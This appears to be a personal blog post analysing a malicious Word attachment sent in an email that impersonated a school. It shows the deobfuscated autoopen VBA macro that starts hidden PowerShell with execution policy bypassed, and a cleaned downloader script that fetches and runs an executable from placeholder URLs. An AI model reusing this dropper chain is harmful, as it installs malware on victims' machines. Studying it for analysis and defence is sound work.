I know, that title sounds weird, especially here, especially me. Security has
been my secret thing for a very long time but I never talked about it before. I
started digging into "malware analysis" some time ago, mostly because I did not
know anything about malware (except that they were not nice). I still do not
know a lot about this topic, but I learned a few things already.

Earlier this week, one of my friends received an email from his child's school.
It was a reply to an email he sent a couple months ago, about his child being
sick back then. Although the content of the email seemed legit, a file named
`ANHANG-16231-21845251.doc` was attached to it, which alerted my friend. He
called the school and got confirmation that no one sent such an email.

My friend asked me what I thought about this story. Double-checking the email
headers, it was trivial to confirm that the school's employee was impersonated.
Given that the reply matched his email, the emails of this person were likely
dumped a while ago and the bad folks started to make "good" use of them. Before
leaving him, I asked my friend to forward me the `.doc` file. See what's coming
next? ðŸ˜‰

## `ANHANG-16231-21845251.doc`

I uploaded this file on [VirusTotal](https://www.virustotal.com) but did not get
a lot of information, so I started a VM with a set of tools to perform static
analysis of this document file.

I am not an expert but I know that Microsoft documents can embed and run
[macros](). I also know that macros have access to a lot of APIs and can run
commands. The only set of tools I am aware of to deal with such formats/files is
[oletools](https://github.com/decalage2/oletools). I knew that this file was
likely hiding macros, but my experience with the so-called "hacking challenges"
also taught me about not overlooking the enumeration phase.

I analyzed the file with `oleid`, which confirmed my intuition and also
indicated that the file was not encrypted:

```

```

The second tool I used was `olevba` to extract the VBA macros from the file
without running them. The output I received looked obfuscated (the snippet below
has been truncated):

```

[...]
```

I took a look at the `olevba` documentation and learned about the `--reveal`
experimental feature. In my case, it worked well and this feature cleaned the
code a bit. It was still obfuscated but less weird:

```
Attribute VB_Name = "zC7wlka"
Sub K9hj1nG()
   Debug.Print "724516UPOp3Hrt23361vC9PPmCKrjITKvEv"
Debug.Print "20994u_8YY68791454rbk4PQHiqapjj9"

End Sub

   Debug.Print "588496Bn5Mps680785i9QMw62Vw29iIrvf"

Debug.Print "826309uz3s8R5980Z6jEJwMSGtCq"
End Sub

[...]
```

I went ahead an cleaned the code even more but I had two references to another
OLE "thing" named `Swlfot9` that I could decode. I knew it had something to do
with [PowerShell]() given the `"powe"` string but I could not find anything
else.

```
Attribute VB_Name = "zC7wlka"

Sub autoopen()
	lc8cJsPt
End Sub

Sub lc8cJsPt()
	Set Win32ProcessstartupObj = GetObject("winmgmts:Win32_ProcessStartup")
	Win32ProcessstartupObj.ShowWindow = 0

	Set Win32ProcessObj = GetObject("winmgmts:Win32_Process")
    Win32ProcessObj.Create "powe" + Swlfot9.FbFMIBR + Swlfot9.bLJAPOF,
	Null,
	Win32ProcessstartupObj,
	ProcessId
End Sub
```

I saw the name `Swlfot9` in the very first `olevba` output though, so I knew
that something was still there, but I could just not see it. I tried some other
oletools but it was a dead-end.

I decided to give the `strings` command a try and found a very large string that
looked like a bas64-encoded string. I piped this string to `base64 -d` and got
some PowerShell code in return:

```powershell
$XvmIXvo='t6jTbM';$PbDL43 = '71';$uj6EVuv='L8KMkkX'; [...]
```

Given that I was stuck with the VBA macro, I decided to clean the PowerShell
code to better understand it. There were unused variables and weird
PowerShell-allowed calls, but in the end, here is what I ended up with:

```powershell
# `$env:userprofile` returns the full path of the profile directory.
$pathToExe = $env:userprofile+'\71.exe';

$webClient = New-Object Net.WebClient;

# List of URLs pointing to a program to download
$urls = [
    http://some.example.com/folder-123/,
    http://another.example.com/folder-456/,
]

foreach ($url in $urls) {
    try {
        # Try to download a program...
        $webClient.DownloadFile($url, $pathToExe);

        # if it worked, then...
        If ((Get-Item $pathToExe).length -ge 24103) {
            # run it!
            Invoke-Item $pathToExe;
            break;
        }

        # otherwise, keep trying.
    } catch {
    }
}
```

This PowerShell script is a **downloader**: its job is to download a really
malicious program. In order to know what kind of program it could be, I used a
third party service to download the program from one of the URLs in the list
above and this service then sent the program to me:

```
$ file 71.exe
71.exe: PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows
```

Before digging into this program, I still had to fully understand the VBA
macro... I searched for a tool able to dump an OLE "thing" from a `.doc` file
and discovered
[oledump.py](https://blog.didierstevens.com/programs/oledump-py/). Analyzing the
different sections, I found an interesting item that I dumped as ASCII:

```
rshell -ExecutionPolicy bypass -WindowStyle Hidden -noprofile -e ,
```

This string corresponded to `Swlfot9.FbFMIBR`. Therefore the other reference was
the payload reversed before. Below is the full line of code (`"PAYLOAD"` should
be replaced with the PowerShell script):

```
Win32ProcessObj.Create "powershell -ExecutionPolicy bypass -WindowStyle Hidden -noprofile -e" + "PAYLOAD"
```
